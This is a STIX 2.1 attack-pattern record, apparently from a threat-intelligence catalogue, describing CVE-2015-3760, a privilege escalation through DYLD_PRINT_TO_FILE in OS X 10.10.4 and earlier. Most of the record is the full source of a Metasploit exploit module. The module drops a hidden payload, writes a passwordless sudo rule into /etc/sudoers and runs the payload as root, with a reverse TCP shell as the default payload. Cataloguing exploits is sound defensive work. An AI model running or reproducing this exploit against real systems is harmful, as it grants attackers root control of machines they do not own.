{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--937e2982-d420-4fcd-a3eb-289a68a8d578",
    "created": "2024-08-14T16:34:48.045791Z",
    "modified": "2024-08-14T16:34:48.045794Z",
    "name": "Apple OS X DYLD_PRINT_TO_FILE Privilege Escalation",
    "description": " In Apple OS X 10.10.4 and prior, the DYLD_PRINT_TO_FILE environment variable is used for redirecting logging data to a file instead of stderr. Due to a design error, this feature can be abused by a local attacker to write arbitrary files as root via restricted, SUID-root binaries. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/dyld_print_to_file_root.rb",
            "external_id": "dyld_print_to_file_root.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-3760"
        },
        {
            "source_name": "reference",
            "url": "https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.reddit.com/r/netsec/comments/3e34i2/os_x_1010_dyld_print_to_file_local_privilege/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Post::OSX::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple OS X DYLD_PRINT_TO_FILE Privilege Escalation',\n      'Description'    => %q{\n        In Apple OS X 10.10.4 and prior, the DYLD_PRINT_TO_FILE environment\n        variable is used for redirecting logging data to a file instead of\n        stderr. Due to a design error, this feature can be abused by a local\n        attacker to write arbitrary files as root via restricted, SUID-root\n        binaries.\n      },\n      'Author'         => [\n        'Stefan Esser', # Vulnerability discovery and PoC\n        'joev'          # Copy/paste monkey\n      ],\n      'References'     => [\n        ['CVE', '2015-3760'],\n        ['URL', 'https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html'],\n        ['URL', 'https://www.reddit.com/r/netsec/comments/3e34i2/os_x_1010_dyld_print_to_file_local_privilege/']\n      ],\n      'DisclosureDate' => '2015-07-21',\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'osx',\n      'Arch'           => ARCH_X64,\n      'SessionTypes'   => ['shell'],\n      'Privileged'     => true,\n      'Targets'        => [\n        ['Mac OS X 10.10-10.10.4', {}]\n      ],\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => { 'PAYLOAD' => 'osx/x64/shell_reverse_tcp' }\n    ))\n\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'Writable directory', '/.Trashes'])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def check\n    (ver?) ? CheckCode::Appears : CheckCode::Safe\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    if check != CheckCode::Appears\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    upload payload_file, binary_payload\n    cmd_exec \"chmod +x #{payload_file}\"\n\n    print_status \"Executing exploit at `#{payload_file}'...\"\n    cmd_exec sploit\n  end\n\n  def ver?\n    Rex::Version.new(get_sysinfo['ProductVersion']).between?(\n      Rex::Version.new('10.10.0'), Rex::Version.new('10.10.4')\n    )\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def sploit\n    %Q{/bin/sh -c \"echo 'echo \\\\\"$(whoami) ALL=(ALL) NOPASSWD:ALL\\\\\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo #{payload_file} &\"}\n  end\n\n  def binary_payload\n    Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)\n  end\n\n  def payload_file\n    @payload_file ||=\n      \"#{base_dir}/.#{Rex::Text.rand_text_alpha(8..12)}\"\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-07-21",
    "x_mitre_platforms": [
        "osx'"
    ]
}